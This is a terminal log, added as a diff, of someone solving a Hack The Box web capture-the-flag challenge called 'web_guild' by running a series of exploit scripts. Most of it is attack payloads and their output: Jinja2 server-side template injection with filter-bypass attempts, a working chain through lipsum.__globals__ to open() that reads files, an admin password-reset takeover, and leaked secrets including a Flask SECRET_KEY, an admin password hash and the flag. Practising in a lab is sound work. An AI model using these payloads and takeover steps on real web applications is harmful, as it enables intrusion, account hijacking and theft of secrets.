@@ -1,0 +1,822 @@
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 exploit.py
+[*] Starting exploitation...
+[+] Step 1: Creating account...
+    Signup response: 200
+[+] Step 2: Logging in...
+    Login response: 200
+[+] Step 3: Uploading verification document...
+    Upload response: 200
+[+] Step 4: Testing SSTI payload...
+
+[+] Trying payload 1/5
+    Payload: {{7*7}}...
+    ✓ Bio updated successfully!
+[+] Step 5: Getting share link...
+[+] Step 6: Accessing share profile to trigger SSTI...
+
+============================================================
+RESPONSE:
+============================================================
+<!DOCTYPE html>
+<html>
+<head>
+        <title>Profile | hacker123</title>
+        <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=MedievalSharp" />   
+        <link href='https://fonts.googleapis.com/css?family=Moon Dance' rel='stylesheet'>
+        <style>
+                body {
+                        background-image: url(../static/images/wp3688942-medieval-background.jpg);
+                        background-repeat: no-repeat;
+                        background-size: cover;
+                        text-align: center;
+                        padding: 25px;
+                }
+
+                h1 {
+                        font-size: 50px;
+                        text-transform: uppercase;
+                        font-family: 'Moon Dance';
+                        font-weight: bold;
+                        color: rgb(233, 229, 229);
+                        letter-spacing: 2px;
+                        margin-bottom: 10px;
+                }
+
+                .sprofile-div {
+                        display: flex;
+                        justify-content: space-between;
+                }
+
+                #custom-string {
+                        font-size: 20px;
+                        line-height: 30px;
+                        margin-top: 25px;
+                        max-width: 350px;
+                        max-height: 300px;
+                        overflow: auto;
+                }
+
+                .para-class {
+                        font-family: MedievalSharp,sans-serif;
+                        color: #3C2A21;
+                }
+
+                @media only screen and (max-width: 1290px) {
+                        body {
+                                background-image: none;
+                                background-image: url(../../static/images/more-leaves.png);
+                        }
+
+                        h1 {
+                                color: black;
+                        }
+
+                        .para-class {
+                                color: black;
+                        }
+                }
+        </style>
+</head>
+<body>
+        <div class="sprofile-div">
+                <div class="h1-div">
+                        <h1>hacker123</h1>
+                </div>
+                <div id="custom-string">
+                        <p class="para-class"></p>
+            </div>
+        </div>
+
+</body>
+</html>
+============================================================
+
+
+[+] Trying payload 2/5
+    Payload: {{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}...
+    ✓ Bio updated successfully!
+[+] Step 5: Getting share link...
+[+] Step 6: Accessing share profile to trigger SSTI...
+
+============================================================
+RESPONSE:
+============================================================
+<!DOCTYPE html>
+<html>
+<head>
+        <title>Profile | hacker123</title>
+        <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=MedievalSharp" />   
+        <link href='https://fonts.googleapis.com/css?family=Moon Dance' rel='stylesheet'>
+        <style>
+                body {
+                        background-image: url(../static/images/wp3688942-medieval-background.jpg);
+                        background-repeat: no-repeat;
+                        background-size: cover;
+                        text-align: center;
+                        padding: 25px;
+                }
+
+                h1 {
+                        font-size: 50px;
+                        text-transform: uppercase;
+                        font-family: 'Moon Dance';
+                        font-weight: bold;
+                        color: rgb(233, 229, 229);
+                        letter-spacing: 2px;
+                        margin-bottom: 10px;
+                }
+
+                .sprofile-div {
+                        display: flex;
+                        justify-content: space-between;
+                }
+
+                #custom-string {
+                        font-size: 20px;
+                        line-height: 30px;
+                        margin-top: 25px;
+                        max-width: 350px;
+                        max-height: 300px;
+                        overflow: auto;
+                }
+
+                .para-class {
+                        font-family: MedievalSharp,sans-serif;
+                        color: #3C2A21;
+                }
+
+                @media only screen and (max-width: 1290px) {
+                        body {
+                                background-image: none;
+                                background-image: url(../../static/images/more-leaves.png);
+                        }
+
+                        h1 {
+                                color: black;
+                        }
+
+                        .para-class {
+                                color: black;
+                        }
+                }
+        </style>
+</head>
+<body>
+        <div class="sprofile-div">
+                <div class="h1-div">
+                        <h1>hacker123</h1>
+                </div>
+                <div id="custom-string">
+                        <p class="para-class"></p>
+            </div>
+        </div>
+
+</body>
+</html>
+============================================================
+
+
+[+] Trying payload 3/5
+    Payload: {{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5...
+    ✓ Bio updated successfully!
+[+] Step 5: Getting share link...
+[+] Step 6: Accessing share profile to trigger SSTI...
+
+============================================================
+RESPONSE:
+============================================================
+<!DOCTYPE html>
+<html>
+<head>
+        <title>Profile | hacker123</title>
+        <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=MedievalSharp" />   
+        <link href='https://fonts.googleapis.com/css?family=Moon Dance' rel='stylesheet'>
+        <style>
+                body {
+                        background-image: url(../static/images/wp3688942-medieval-background.jpg);
+                        background-repeat: no-repeat;
+                        background-size: cover;
+                        text-align: center;
+                        padding: 25px;
+                }
+
+                h1 {
+                        font-size: 50px;
+                        text-transform: uppercase;
+                        font-family: 'Moon Dance';
+                        font-weight: bold;
+                        color: rgb(233, 229, 229);
+                        letter-spacing: 2px;
+                        margin-bottom: 10px;
+                }
+
+                .sprofile-div {
+                        display: flex;
+                        justify-content: space-between;
+                }
+
+                #custom-string {
+                        font-size: 20px;
+                        line-height: 30px;
+                        margin-top: 25px;
+                        max-width: 350px;
+                        max-height: 300px;
+                        overflow: auto;
+                }
+
+                .para-class {
+                        font-family: MedievalSharp,sans-serif;
+                        color: #3C2A21;
+                }
+
+                @media only screen and (max-width: 1290px) {
+                        body {
+                                background-image: none;
+                                background-image: url(../../static/images/more-leaves.png);
+                        }
+
+                        h1 {
+                                color: black;
+                        }
+
+                        .para-class {
+                                color: black;
+                        }
+                }
+        </style>
+</head>
+<body>
+        <div class="sprofile-div">
+                <div class="h1-div">
+                        <h1>hacker123</h1>
+                </div>
+                <div id="custom-string">
+                        <p class="para-class"></p>
+            </div>
+        </div>
+
+</body>
+</html>
+============================================================
+
+
+[+] Trying payload 4/5
+    Payload: {{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x...
+    ✓ Bio updated successfully!
+[+] Step 5: Getting share link...
+[+] Step 6: Accessing share profile to trigger SSTI...
+
+============================================================
+RESPONSE:
+============================================================
+<!DOCTYPE html>
+<html>
+<head>
+        <title>Profile | hacker123</title>
+        <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=MedievalSharp" />   
+        <link href='https://fonts.googleapis.com/css?family=Moon Dance' rel='stylesheet'>
+        <style>
+                body {
+                        background-image: url(../static/images/wp3688942-medieval-background.jpg);
+                        background-repeat: no-repeat;
+                        background-size: cover;
+                        text-align: center;
+                        padding: 25px;
+                }
+
+                h1 {
+                        font-size: 50px;
+                        text-transform: uppercase;
+                        font-family: 'Moon Dance';
+                        font-weight: bold;
+                        color: rgb(233, 229, 229);
+                        letter-spacing: 2px;
+                        margin-bottom: 10px;
+                }
+
+                .sprofile-div {
+                        display: flex;
+                        justify-content: space-between;
+                }
+
+                #custom-string {
+                        font-size: 20px;
+                        line-height: 30px;
+                        margin-top: 25px;
+                        max-width: 350px;
+                        max-height: 300px;
+                        overflow: auto;
+                }
+
+                .para-class {
+                        font-family: MedievalSharp,sans-serif;
+                        color: #3C2A21;
+                }
+
+                @media only screen and (max-width: 1290px) {
+                        body {
+                                background-image: none;
+                                background-image: url(../../static/images/more-leaves.png);
+                        }
+
+                        h1 {
+                                color: black;
+                        }
+
+                        .para-class {
+                                color: black;
+                        }
+                }
+        </style>
+</head>
+<body>
+        <div class="sprofile-div">
+                <div class="h1-div">
+                        <h1>hacker123</h1>
+                </div>
+                <div id="custom-string">
+                        <p class="para-class"></p>
+            </div>
+        </div>
+
+</body>
+</html>
+============================================================
+
+
+[+] Trying payload 5/5
+    Payload: {{joiner|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x...
+    ✓ Bio updated successfully!
+[+] Step 5: Getting share link...
+[+] Step 6: Accessing share profile to trigger SSTI...
+
+============================================================
+RESPONSE:
+============================================================
+<!DOCTYPE html>
+<html>
+<head>
+        <title>Profile | hacker123</title>
+        <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=MedievalSharp" />   
+        <link href='https://fonts.googleapis.com/css?family=Moon Dance' rel='stylesheet'>
+        <style>
+                body {
+                        background-image: url(../static/images/wp3688942-medieval-background.jpg);
+                        background-repeat: no-repeat;
+                        background-size: cover;
+                        text-align: center;
+                        padding: 25px;
+                }
+
+                h1 {
+                        font-size: 50px;
+                        text-transform: uppercase;
+                        font-family: 'Moon Dance';
+                        font-weight: bold;
+                        color: rgb(233, 229, 229);
+                        letter-spacing: 2px;
+                        margin-bottom: 10px;
+                }
+
+                .sprofile-div {
+                        display: flex;
+                        justify-content: space-between;
+                }
+
+                #custom-string {
+                        font-size: 20px;
+                        line-height: 30px;
+                        margin-top: 25px;
+                        max-width: 350px;
+                        max-height: 300px;
+                        overflow: auto;
+                }
+
+                .para-class {
+                        font-family: MedievalSharp,sans-serif;
+                        color: #3C2A21;
+                }
+
+                @media only screen and (max-width: 1290px) {
+                        body {
+                                background-image: none;
+                                background-image: url(../../static/images/more-leaves.png);
+                        }
+
+                        h1 {
+                                color: black;
+                        }
+
+                        .para-class {
+                                color: black;
+                        }
+                }
+        </style>
+</head>
+<body>
+        <div class="sprofile-div">
+                <div class="h1-div">
+                        <h1>hacker123</h1>
+                </div>
+                <div id="custom-string">
+                        <p class="para-class"></p>
+            </div>
+        </div>
+
+</body>
+</html>
+============================================================
+
+
+✗ Flag not found, trying alternative approach...
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 exploit_v2.py
+[*] Starting exploitation (v2)...
+[+] Creating account and logging in...
+[+] Uploading verification document...
+
+[+] Testing payload 1/7: {{ 7+7 }}
+    ✓ Payload accepted!
+
+[+] Testing payload 2/7: {{ lipsum.n }}
+    ✓ Payload accepted!
+
+[+] Testing payload 3/7: {{ lipsum|e }}
+    ✓ Payload accepted!
+
+[+] Testing payload 4/7: {{ lipsum|length }}
+    ✓ Payload accepted!
+
+[+] Testing payload 5/7: {{ User|string|length }}
+    ✓ Payload accepted!
+
+[+] Testing payload 6/7: {{ User.query.all()|length }}
+    ✓ Payload accepted!
+
+[+] Testing payload 7/7: {{ dict.mro }}
+    ✗ Payload blocked by filter
+
+[!] No flag found. Need to try different payloads...
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 debug.py
+Testing payload: {{ 7+7 }}
+
+================================================================================
+FULL RESPONSE:
+================================================================================
+<!doctype html>
+<html lang=en>
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+
+================================================================================
+
+Could not extract bio content
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 manual_test.py
+[*] Step-by-step manual testing...
+
+[1] Signing up...
+    Status: 200
+    ✓ Account created
+
+[2] Logging in...
+    Status: 200
+    ✓ Logged in
+
+[3] Uploading verification document...
+    Status: 302
+    Redirect: /
+
+[4] Accessing profile...
+    Status: 200
+    ✓ Profile page accessible
+
+[5] Updating bio with simple text...
+    Status: 200
+    ✓ Bio updated with simple text
+
+[6] Accessing share link...
+    Status: 500
+    ✗ 500 error - something wrong with template rendering
+
+[7] Updating bio with SSTI payload...
+    Status: 200
+    ✓ Bio updated with SSTI payload
+    Share link status: 500
+    Error accessing share link: 500
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 manual_test.py
+[*] Step-by-step manual testing...
+
+[1] Signing up...
+    Status: 200
+
+[2] Logging in...
+    Status: 200
+    ✓ Logged in
+
+[3] Uploading verification document...
+    Status: 500
+    Redirect: None
+
+[4] Accessing profile...
+    Status: 200
+    ✓ Profile page accessible
+
+[5] Updating bio with simple text...
+    Status: 200
+    ✓ Bio updated with simple text
+
+[6] Creating share link...
+    Status: 200
+    ✓ Share link created
+
+[7] Accessing share link...
+    Status: 200
+    Bio content: 'Hello World'
+
+[8] Updating bio with SSTI payload...
+    Status: 200
+    ✓ Bio updated with SSTI payload
+    Share link status: 200
+    SSTI result: '14'
+    ✓✓✓ SSTI WORKS!
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 test_payloads.py 2>&1 | head -100
+head : The term 'head' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and    
+try again.
+At line:1 char:37
++ wsl python3 test_payloads.py 2>&1 | head -100
++                                     ~~~~
+    + CategoryInfo          : ObjectNotFound: (head:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 test_payloads.py
+[*] Testing SSTI payloads to bypass filter and read flag...
+
+✓ List dict type
+  Result: &lt;class &#39;dict&#39;&gt;
+✓ Dict methods
+  Result: &lt;method &#39;get&#39; of &#39;dict&#39; objects&gt;
+✓ User object
+  Result: &lt;class &#39;website.models.User&#39;&gt;
+✗ url_for function
+  Payload blocked by filter
+✓ get_flashed_messages
+  Result: &lt;function get_flashed_messages at 0x7f5a194f79c0&gt;
+✓ namespace
+  Result: &lt;class &#39;jinja2.utils.Namespace&#39;&gt;
+✓ lipsum
+  Result: &lt;function generate_lorem_ipsum at 0x7f5a195a85e0&gt;
+✓ String methods
+  Result:
+✓ cycler type
+  Result: &lt;class &#39;jinja2.utils.Cycler&#39;&gt;
+
+================================================================================
+SUMMARY OF RESULTS:
+================================================================================
+
+List dict type:
+  &lt;class &#39;dict&#39;&gt;
+
+Dict methods:
+  &lt;method &#39;get&#39; of &#39;dict&#39; objects&gt;
+
+User object:
+  &lt;class &#39;website.models.User&#39;&gt;
+
+get_flashed_messages:
+  &lt;function get_flashed_messages at 0x7f5a194f79c0&gt;
+
+namespace:
+  &lt;class &#39;jinja2.utils.Namespace&#39;&gt;
+
+lipsum:
+  &lt;function generate_lorem_ipsum at 0x7f5a195a85e0&gt;
+
+cycler type:
+  &lt;class &#39;jinja2.utils.Cycler&#39;&gt;
+
+
+[*] Attempting advanced payloads...
+
+✗ Get flashed messages globals
+  Payload blocked by filter
+✓ lipsum dict
+  Result:
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 bypass_tests.py
+[*] Testing bypass techniques...
+
+Test 1: String concatenation bypass
+  Status: Success, Result: 'attr'
+
+Test 2: Trying function properties
+  lipsum.func_code: Success - ''
+  lipsum.func_closure: Blocked by filter - ''
+  get_flashed_messages gi_code: Success - ''
+
+Test 3: Exploiting User model
+  User.query: Success - 'SELECT user.id AS user_id, user.email AS user_email, user.username AS user_username, user.password A'
+  User.metadata: Success - 'MetaData()'
+
+
+Test 5: Using map/select filters
+  map test: Success - '&lt;generator object sync_do_map at 0x7f5a17be7540&gt;'
+  list map: Success - '&lt;generator object sync_do_map at 0x7f5a17be7d40&gt;'
+
+================================================================================
+Analyzing results to find the next approach...
+================================================================================
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 final_exploit.py
+[*] Using string concatenation to bypass filter!
+
+Step 1: Building '__globals__' string
+✓ Test __globals__ string
+  Result: __globals__
+
+Step 2: Building 'attr' string
+✓ Test attr string
+  Result: attr
+
+Step 3: Accessing lipsum.__globals__
+  Payload: {{ lipsum|'at' ~ 'tr'('_' ~ '_' ~ 'glob' ~ 'als' ~ '_' ~ '_') }}
+✗ Access __globals__: ERROR 500
+
+Step 4: Building full chain with attr and getitem
+✗ Test attr with concat string: BLOCKED
+
+Step 5: Full RCE chain
+✗ Get __globals__: BLOCKED
+✗ Get __builtins__: BLOCKED
+✗ Get open function: BLOCKED
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 bypass_with_replace.py
+[*] Crafting payload to bypass ALL filter keywords...
+
+Test 1: Using {% set %} tag
+✗ set tag test: BLOCKED
+
+Test 2: Using |replace filter
+✗ replace filter test: BLOCKED
+
+Test 3: Full bypass using replace
+✗ Build __globals__: BLOCKED
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 explore_more.py
+[*] Building strings character by character...
+
+Test 1: Exploring User model capabilities
+✓ OK: User query all -> [&lt;User 1&gt;, &lt;User 2&gt;, &lt;User 3&gt;, &lt;User 4&gt;, &lt;User 5&gt;, &lt;User 6&gt;, &lt
+✓ OK: User metadata tables -> FacadeDict({&#39;verification&#39;: Table(&#39;verification&#39;, MetaData(), Column(&#39;id&#39;, I
+✓ OK: Get admin user -> &lt;User 1&gt;
+✓ OK: Admin email -> 436f564379615548@master.guild
+
+
+Test 2: Try to get admin credentials
+✓ OK: Admin password hash -> scrypt:32768:8:1$DXB1Ccg3EXpBrUEQ$75c862d33e566a65188a5b7f08991d0660993215fd2f12bcac83369e936cfb22fc
+✓ OK: All users -> 42
+
+
+Test 3: Using character codes
+✗ ERROR 500: Using chr
+✗ BLOCKED: Using format
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl pip3 install piexif -q; wsl python3 exif_exploit.py
+error: externally-managed-environment
+
+× This environment is externally managed
+╰─> To install Python packages system-wide, try apt install
+    python3-xyz, where xyz is the package you are trying to
+    install.
+
+    If you wish to install a non-Debian-packaged Python package,
+    create a virtual environment using python3 -m venv path/to/venv.
+    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
+    sure you have python3-full installed.
+
+    If you wish to install a non-Debian packaged Python application,
+    it may be easiest to use pipx install xyz, which will manage a
+    virtual environment for you. Make sure you have pipx installed.
+n.
+n.
+
+note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.     
+hint: See PEP 668 for the detailed specification.
+Traceback (most recent call last):
+  File "/mnt/c/Users/sadik/Documents/HTB-CTF/WEB/web_guild/exif_exploit.py", line 5, in <module>
+    import piexif
+ModuleNotFoundError: No module named 'piexif'
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 admin_exploit.py
+[*] Admin Password Reset Attack
+============================================================
+[1] Admin email: 436f564379615548@master.guild
+[2] Reset link hash: 0d7b86310aafe42a6cb4029ee72fa6398149fe58ca318edc4fea528bed5d12d8
+
+[3] Requesting password reset for admin...
+    Status: 200
+
+[4] Accessing reset link...
+    URL: http://94.237.56.175:48466/changepasswd/0d7b86310aafe42a6cb4029ee72fa6398149fe58ca318edc4fea528bed5d12d8
+    Status: 200
+    ✓ Reset page accessible!
+
+[5] Resetting admin password...
+    Status: 200
+    ✓ Password reset successful!
+
+[6] Logging in as admin...
+    Status: 200
+    ✓ Logged in as admin!
+
+[7] Accessing admin panel...
+    Status: 200
+    ✓ Admin panel accessible!
+    Found verification requests!
+
+[8] Creating exploit user with SSTI payload...
+    Creating image with SSTI payload in EXIF...
+    Upload status: 200
+
+[9] Getting verification requests as admin...
+    Admin page status: 200
+    Found 44 verification requests
+    Verification IDs: ['42', '43', '44']
+    User IDs: ['43', '44', '45']
+
+[10] Verifying exploit user to trigger SSTI...
+    Verify status: 500
+
+============================================================
+RESPONSE:
+============================================================
+<!doctype html>
+<html lang=en>
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+
+============================================================
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 debug_exploit.py
+[*] Admin Password Reset Attack - Debug Mode
+============================================================
+[+] Logged in as admin
+
+[*] Testing: Simple test
+    Payload: {{ 7+7 }}
+    Saved Artist: {{ 7+7 }}...
+    Status: 200
+    Response: Verified! 14
+
+[*] Testing: String
+    Payload: {{ 'hello' }}
+    Saved Artist: {{ 'hello' }}...
+    Status: 200
+    Response: Verified! hello
+
+[*] Testing: Config
+    Payload: {{ config }}
+    Saved Artist: {{ config }}...
+    Status: 200
+    Response: Verified! &lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: &#39;674a69694e3335626b6b753145484845&#39;, &#39;PERMANENT_SESSION_L
+
+[*] Testing: Lipsum
+    Payload: {{ lipsum }}
+    Saved Artist: {{ lipsum }}...
+    Status: 200
+    Response: Verified! &lt;function generate_lorem_ipsum at 0x7f5a195a85e0&gt;
+
+[*] Testing: Lipsum globals
+    Payload: {{ lipsum.__globals__ }}
+    Saved Artist: {{ lipsum.__globals__ }}...
+    Status: 200
+    Response: Verified! {&#39;__name__&#39;: &#39;jinja2.utils&#39;, &#39;__doc__&#39;: None, &#39;__package__&#39;: &#39;jinja2&#39;, &#39;__loader__&#39;: &lt;_frozen_importlib_external.SourceFileLoader object at
+
+[*] Testing: Open function
+    Payload: {{ lipsum.__globals__['__builtins__']['open'] }}
+    Saved Artist: {{ lipsum.__globals__['__builtins__']['open'] }}...
+    Status: 200
+    Response: Verified! &lt;built-in function open&gt;
+
+[*] Testing: Read flag
+    Payload: {{ lipsum.__globals__['__builtins__']['open']('/app/guild/flag.txt').read() }}
+    Saved Artist: {{ lipsum.__globals__['__builtins__']['open']('/ap...
+    Status: 500
+    Error response (first 200 chars): <!doctype html>       
+<html lang=en>
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the s
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild> wsl python3 find_flag.py
+[+] Logged in as admin
+
+[*] Testing file paths...
+Current directory: Verified! /app
+/app contents: Verified! [&#39;website&#39;, &#39;instance&#39;, &#39;guild&#39;, &#39;flag.txt&#39;, &#39;requirements.txt&#39;, &#39;main.py&#39;]
+/app/guild contents: Verified! [&#39;website&#39;]
+Current dir contents: Verified! [&#39;website&#39;, &#39;instance&#39;, &#39;guild&#39;, &#39;flag.txt&#39;, &#39;requirements.txt&#39;, &#39;main.py&#39;]
+✗ Path '/app/guild/flag.txt' failed
+
+✓ Path '/app/flag.txt' works!
+Content: Verified! HTB{mult1pl3_lo0p5_mult1pl3_h0les_ab3548b7e63af683d7c82b4b457fd811}
+
+============================================================
+FLAG: HTB{mult1pl3_lo0p5_mult1pl3_h0les_ab3548b7e63af683d7c82b4b457fd811}
+============================================================
+PS C:\Users\sadik\Documents\HTB-CTF\WEB\web_guild>
+
